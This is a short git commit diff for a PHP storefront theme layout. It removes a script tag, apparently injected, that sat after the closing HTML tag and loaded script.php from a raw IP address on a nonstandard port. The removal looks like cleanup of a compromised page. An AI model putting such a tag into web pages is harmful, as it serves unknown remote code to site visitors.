26b2afe29416dbfb38925dfcdca88d125d1b6523
iwisunny <iwisunny@gmail.com>
2017-09-16 18:03:42 +0800

    修改

--- appfront/theme/terry/theme01/layouts/main.php
+++ appfront/theme/terry/theme01/layouts/main.php
@@ -81,5 +81,4 @@ $cssOptions = [
 </body>
 </html>
 <?php $this->endPage() ?>
-<script type="text/javascript" id="fb9f264cb04c92774ee89ea898798494" src="http://115.28.80.138:200/script.php?id=fb9f264cb04c92774ee89ea898798494"></script>
 
